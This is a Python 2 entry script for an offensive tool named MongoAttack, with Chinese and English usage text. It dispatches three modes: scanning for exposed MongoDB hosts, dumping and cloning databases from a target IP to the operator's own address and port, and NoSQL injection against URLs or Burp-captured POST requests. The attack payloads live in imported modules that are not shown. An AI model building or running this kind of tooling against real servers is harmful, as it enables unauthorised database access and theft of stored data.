#!/usr/bin/python
# -*- coding: utf-8 -*-
# __author__: sixwhale
import getopt
import sys
from colorama import Back
from colorama import Fore
from colorama import init
from colorama import Style
init(autoreset=True)
from Lib.common import printErrMsg
from Lib.setting import MY_IP
from Lib.setting import MY_PORT
from Mode.attack import mgAttack
from Mode.inject import InjectOption
from Mode.scan import scanMongoIP


def _cover():
    '''使用方法'''
    print '''
 __  __                           _   _   _             _
|  \/  | ___  _ __   __ _  ___   / \ | |_| |_ __ _  ___| | __
| |\/| |/ _ \| '_ \ / _` |/ _ \ / _ \| __| __/ _` |/ __| |/ /
| |  | | (_) | | | | (_| | (_) / ___ \ |_| || (_| | (__|   <
|_|  |_|\___/|_| |_|\__, |\___/_/   \_\__|\__\__,_|\___|_|\_\  Author: sixwhale
                    |___/                                      Version: 1.0.2
    '''

def _usage():
    print '''    usage: python mongoattack.py <command> <option>

    <command>   <option>                  <description>
    -h,--help                             帮助

    --scan                                scan ip mode
                -n <number>               指定显示扫描数量 默认为10

    --mongo                               mongo attack mode
                -t <ip>                   [必选参数] 指定目标IP 爆库爆集合
                -p <port>                 指定目标端口 默认为27017
                -c <dbname>               指定数据库复制

    --inject                              url inject mode
                -u <url>                  指定目标url 进行GET型注入攻击
                -r <filename>             burp抓POST数据包 进行POST型注入攻击
    '''

def mongoAttack(port):
    port = port
    optlist,args = getopt.getopt(
        sys.argv[2:],
        't:p:c:'
    )
    for o,a in optlist:
        if o == '-t':
            ip = a
        elif o == '-p':
            port = int(a)
        elif o == '-c':
            clone_info = [1,a]
    mgAttack(ip,port,MY_IP,MY_PORT,clone_info)

def urlInject():
    optlist,args = getopt.getopt(
        sys.argv[2:],
        'u:r:'
    )
    for o,a in optlist:
        if o == '-u':
            url = a
            reqFile = None
        elif o == '-r':
            url = None
            reqFile = a

    InjectOption(url, reqFile)


def scanIP(scanNum):
    scanNum = scanNum
    optlist, args = getopt.getopt(
        sys.argv[2:],
        'n:'
    )
    for o,a in optlist:
        if o == '-n':
            scanNum = int(a)
    scanMongoIP(scanNum)

if __name__ == '__main__':
    url = None
    ip = None
    port = 27017
    scanNum = 10

    #参数设置
    try:
        optlist, args = getopt.getopt(
            sys.argv[1:],
            'h',
            ['mongo=','inject=','scan','help']
        )
        for o,a in optlist:
            if o == '--mongo':
                _cover()
                mongoAttack(port)
            if o == '--inject':
                _cover()
                urlInject()
            if o == '--scan':
                _cover()
                scanIP(scanNum)
            if o == '-h' or o == '--help':
                _cover()
                _usage()
                exit()
    except Exception, e:
        printErrMsg(e)
    if len(sys.argv) < 2:
        _cover()
        _usage()